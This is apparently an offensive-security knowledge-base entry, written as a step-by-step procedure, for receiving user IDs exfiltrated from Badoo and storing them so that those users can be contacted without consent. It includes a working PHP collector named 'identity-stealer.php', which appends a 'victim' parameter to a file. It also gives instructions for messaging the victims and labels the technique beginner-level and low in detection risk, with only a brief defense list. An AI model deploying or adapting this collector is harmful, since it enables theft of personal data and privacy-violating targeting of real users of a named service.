---
tags:
  - data-collection
  - php
  - targeted-campaign
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/store-user-id-php]]'
platforms:
  - Web
techniques:
  - '[[Archive via Utility]]'
skill_level: beginner
impact_level: high
detection_risk: low
sub_techniques: []
id: b01d6964-ad00-4a7e-9549-9f45da639977
created_at: '2025-12-14T17:28:52.080Z'
updated_at: '2025-12-14T17:28:52.080Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Archive via Utility]]'
---
# Store-and-Utilize-Collected-User-IDs

## Summary

This procedure handles server-side reception of exfiltrated user IDs, stores them in a file for persistence, and outlines their use in targeted advertising or messaging campaigns without user consent.

## Description

For the Badoo exploitation, a simple PHP script captures the 'victim' GET parameter from the XMLHttpRequest and appends it to a text file. The collected IDs can then be used to identify and contact users on Badoo via private messages or emails, enabling privacy-violating targeted actions. This step completes the collection phase.

## Requirements

1. PHP-enabled web server
2. Write permissions on the server filesystem
3. List of collected IDs for follow-up actions

## Defense

Defensive measures and detection strategies:

- Log and alert on unexpected GET parameters to custom endpoints
- Rate-limit requests to storage scripts
- Anonymize or pseudonymize user data in campaigns

## Objectives

1. Persist received user IDs
2. Aggregate for analysis
3. Enable targeted outreach

## Instructions

### Step 1: Deploy Storage Script

**Context**: Create the PHP handler for incoming requests.

Save as identity-stealer.php: Use [[commands/store-user-id-php]].

```php
<?php $user = $_GET['victim']; $fd = fopen("badoo-users-interested-in-my-product.txt","a"); fwrite($fd, $user); fclose($fd); ?>
```

> Appends $user to file. Expected output: No visible response, but file updated.

### Step 2: Utilize the Collected Data

**Context**: Process the file for campaigns.

Read badoo-users-interested-in-my-product.txt and use IDs to search/contact users on Badoo.

> Manual or scripted outreach. Expected output: List of unique IDs ready for use.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Archive via Utility]]

### Sub-Techniques


## Commands Used

- [[commands/store-user-id-php]]

## Tools Used


## Tags

- [[data-storage]]
- [[privacy-violation]]
